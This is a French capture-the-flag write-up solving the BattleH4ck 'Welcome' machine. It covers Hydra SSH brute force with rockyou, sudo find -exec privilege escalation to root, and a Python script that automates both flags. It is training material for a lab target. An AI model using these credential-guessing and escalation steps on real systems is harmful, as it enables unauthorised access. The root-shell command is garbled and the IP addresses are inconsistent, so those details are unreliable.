---
title: "[Facile - Linux] Welcome"
description: Résolution de la machine Welcome
slug: battlehack_welcome
date: 2023-10-03 00:00:00+0000
image: images/welcome_cover.jpg
translationKey: battlehack_welcome
categories:
    - BattleH4ck
tags:
    - Linux
    - Pentest
weight: 1       
---
## Description

> Welcome to the BattleH4cK platform. In this first mission, your instructor will guide you step by step to give you a glimpse of the game... To enter the competition, you will have to demonstrate your skills. Can you connect yourself to this machine? It should be easy, but we are nice, so here are the information we know about it: The username should be seela The password used is weak

## Données

En lisant la description de la mission, nous apprenons que nous pouvons nous connecter à la machine en sachant que :

- L'utilisateur *devrait* être **seela**
- Le mot de passe *utilisé* est **faible**
- L'adresse IP est : 10.42.20.52

## Mode normal

### Reconnaissance

### Analyse de ports

Tout d'abord, nous devons connaître quels services sont ouverts sur la machine.
Pour cela, nous allons utiliser l'outil *nmap* :

```bash
└─$ nmap 10.42.20.52 --script=default -sV
```

Options explained:
|Option             |Description                                             |
|-------------------|--------------------------------------------------------|
|--script=default   |Permet de lancer un scan qui utilise un pannel de scripts.|
|-sV                |Détection de version                                     |

```bash
Nmap scan report for 10.42.20.52
Host is up (0.064s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:c2:f2:9c:8f:17:5d:66:9a:90:c9:e9:b3:1a:0a:bc (RSA)
|   256 ea:73:61:43:b8:7d:db:88:2b:d7:a8:16:39:49:b6:40 (ECDSA)
|_  256 be:5e:54:f8:6d:3c:de:7d:53:17:99:08:65:0c:34:a0 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 3.00 seconds
```

Nous pouvons observer la présence du port 22 qui correspond au service SSH.
En nous rappelant des données initiales, nous savons que :

- L'utilisateur *devrait* être **seela**
- Le mot de passe *utilisé* est **faible**

Avons de continuer, jetons un oeil aux verbes utilisés :
Il y a : "devrait" et "utilisé".
Quand nous regardons la phrase à propos du mot de passe, nous observons le mot "utilisé" qui peut paraitre un peu confus.

Avant de poursuivre, examinons les verbes utilisés.
Il y a "devrait" et "utilisé".
Dans la phrase sur le mot de passe, le mot "utilisé" est un peu déroutant.
Il y a deux possibilités d'interprétation :

- **faible** est le mot de passe
- le mot de passe est faible, c'est-à-dire qu'il est trop facile à deviner

Pour savoir si le mot de passe est égal à **faible**, nous devons essayer de nous connecter avec lui et avec le nom d'utilisateur **seela**.
(Le nom d'utilisateur n'est pas si déroutant, car il ne signifie rien).

Pour nous connecter à la machine en utilisant nos données, nous pouvons utiliser **ssh** :

```bash
└─$ ssh seela@10.42.20.52
seela@10.42.20.54's password: weak

Permission denied, please try again.
```

Sachant que nous sommes refusé, nous pouvons comprendre que notre mot de passe n'est pas égal à "faible" mais qu'il est faible, c'est-à-dire facile à deviner.

### Bruteforcer le mot de passe de seela

Pour trouver le mot de passe utilisé par seela, comme le dit Google, nous pouvons utiliser une attaque appelée "bruteforce".
![image](https://user-images.githubusercontent.com/69204254/216843124-4edabd84-d823-4160-99b9-cc1e70e4f314.png)

Dans le premier [lien](https://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/), nous pouvons voir qu'il existe un outil appelé "Hydra" qui peut nous aider dans cette situation.
Nous pouvons constater qu'il existe un outil appelé "Hydra" qui peut nous aider dans cette situation.
Le site web nous dit que nous avons besoin d'un nom d'utilisateur et d'une liste de mots.
Pour savoir quelle liste de mots nous devrions utiliser, nous pouvons essayer de demander à Google quelle liste pourrait être utile.
![image](https://user-images.githubusercontent.com/69204254/216844703-e851e499-3d64-436c-aa13-1046feaed78f.png)

En regardant le premier lien, nous pouvons lire que la liste de mots rockyou peut être bonne à essayer.
Si vous possédez Kali Linux, rockyou se trouve dans /usr/share/wordlist/rockyou.txt.gz (vous pouvez aussi taper la commande : wordlists).

Pour l'instant, rockyou est gzipé, pour l'extraire, on peut utiliser **gunzip**, en faisant :

```bash
└─$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

Maintenant que nous avons une liste de mots, lançons Hydra !

```bash
└─$ hydra -l seela -P /usr/share/wordlists/rockyou.txt ssh://10.42.20.52 -t 4
```

Options explained:
|Option             |Description                                             |
|-------------------|--------------------------------------------------------|
|-l NOM_UTILISATEUR   |ou -L FICHIER login avec le NOM_UTILISATEUR, ou charger plusieurs logins à partir de FICHIER|
|-P FICHIER                |ou -P FICHIER essayer le mot de passe PASS, ou charger plusieurs mots de passe à partir de FICHIER|
|-t TACHES|Lance TACHES nombre de connexions en parallèle (par défaut : 16)|


```bash
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.42.20.54:22/
[22][ssh] host: 10.42.20.54   login: seela   password: rockyou
1 of 1 target successfully completed, 1 valid password found
```

Nous avons obtenu notre mot de passe, ce qui est **rockyou** !

Essayons de nous connecter à la machine de la même manière qu'avant :

```bash
└─$ ssh seela@10.42.20.52
seela@10.42.20.54's password: rockyou
```

*Resultat :*

```bash
Linux welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw 5.15.0-39-generic #42-Ubuntu SMP Thu Jun 9 23:42:32 UTC 2022 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$
```

Comme on peut le voir, nous sommes maintenant connectés !
Le premier drapeau est dans le répertoire dans lequel nous nous trouvons :

```bash
seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$ ls -l
```

Options explained:
|Option|Description|
|-|-|
|-l|utiliser un format de liste long|

*Resultat :*

```bash
total 4
-rw-r--r-- 1 root root 17 Feb  5 20:23 user.txt
```

Récupérons le contenu du drapeau `user.txt`.

```bash
└─$ cat user.txt
```

*Resultat :*

```bash
FLAG{someCharacters}
```

### Elevation de privilèges

```bash
seela@welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:~$ sudo -l
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for seela: rockyou
```

Options Explained:
|Option|Description|
|-|-|
|-l|Liste les commandes autorisées (et interdites) pour l'utilisateur qui les invoque sur l'hôte actuel.|

```bash
Matching Defaults entries for seela on welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User seela may run the following commands on welcome-fb9c8a3a-e8e7-4841-801e-2855d61875c0-5b4df8d557-kpmdw:
    (root) /usr/bin/find *
```

Comme nous pouvons le voir, en utilisant sudo, nous pouvons lancer la commande find avec n'importe quel paramètre, en tant qu'utilisateur `root`.
Initialement, find est utilisé pour trouver des choses sur le système. Mais, lorsque nous jetons un coup d'oeil à son manuel, nous pouvons utiliser de nombreuses options.

Pour l'instant, nous aimerions devenir `root` ou lire le drapeau `/root/root.txt`.
Pour ce faire, nous allons chercher des options qui peuvent faire l'une de ces choses.

Une fois que nous avons lu le manuel, nous pouvons parler d'une option : `-exec`.

L'option `-exec` nous permettra d'exécuter une commande lorsqu'un fichier recherché est trouvé.
Ici, nous aimerions lire le contenu de `/root/root.txt`.

Pour ce faire, nous pouvons exécuter la commande suivante :

```bash
sudo find /root/root.txt -exec cat {} \ ;
```

Ce qui nous donne le drapeau final.

Si nous le souhaitons, nous pouvons également obtenir un shell root, en utilisant la commande suivante :

```bash
sudo find / -exec bash \N- \N- \N- \N ;
```

## Mode rapidité

Dans ce mode, notre objectif est de résoudre la machine le plus rapidement possible.
Pour cela, j'ai créé un script python (qui n'est pas nécessairement le langage le plus rapide) qui automatise nos différentes actions de résolution.

*Le script de lancement de machine et de validation des drapeaux n'est pas donné.*
*Seul le script de résolution de machine sera donné.*

Tout d'abord, il nous faut noter le processus de résolution de la machine.
Dans un premier temps, nous avons cherché le mot de passe de l'utilisateur `seela`.
Ensuite, nous nous sommes connecté sur le serveur distant en SSH grâce aux identifiants obtenus et avons récupéré notre premier drapeau.
Une fois connecté, nous avons observé les droits de l'utilisateur `seela` afin de découvrir qu'il peut lancer la commande `find` en tant que `root`.
Nous avons terminé, la machine en affichant le contenu du drapeau `/root/root.txt`.

L'objectif de cette partie est d'extraire de notre processus initial les étapes nécessaires à la résolution de la machine.

### Prise de raccourcis

Dans cette partie, nous listons les divers raccourcis pris pour gagner un maximum de temps :

- après relancement de la machine, nous observons que le mot de passe reste le même. Ainsi, nous n'aurons **pas besoin de réaliser à nouveau l'étape de bruteforce**.
- au lieu de chercher les deux drapeaux séparéments, nous pouvons utiliser une seule commande.

### Recherche de modules

Afin de pouvoir accéder au service SSH de la machine, deux modules ont été sélectionnés :

- [paramiko](https://www.paramiko.org/) : l'une des bibliothèques les plus connues pour ce qui est de se connecter à distance à un autre ordinateur à l'aide de SSHv2

- [ssh2-python](https://pypi.org/project/ssh2-python/) : bibliothèque de connexion à distance via SSHv2 qui se dit "très rapide"

Le choix de ces deux modules a été vu dans un aspect comparatif. Un script pour chaque module a été mis en place. Pour ma part, j'ai trouvé le module `ssh2-python` plus rapide que `paramiko`.

### Script utilisé

Ainsi, un script de résolution a été conçu avec l'aide du module ssh2-python.

```python
from ssh2.session import Session # ssh2-python
import socket
import hbrunner # Module personnalisé de lancement des machines et envois des drapeaux

# Lancement de la machine Welcome en mode "rapidité"
bot = hbrunner.Runner("welcome", "speedrun", "vpn")
# Obtention de l'adresse IP
ipAddress = bot.getIpAddress()[0]

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ipAddress, 22))
session = Session()
session.handshake(sock)
# identifiants SSH
session.userauth_password("seela","rockyou")
channel = session.open_session()
# Envoi du mot de passe sudo demandé, puis lecture des deux drapeaux
channel.execute("echo rockyou|sudo -S find /home/seela/user.txt /root/root.txt -exec cat {} \;")
size,data=channel.read()

while size > 0:
    # Envoi du drapeau à la plateforme
    bot.sendFlag(data.decode())
    size,data=channel.read()
```

### Score temps

Cela m'a permis d'atteindre un temps de résolution de moins d'1 seconde (~0.7s).
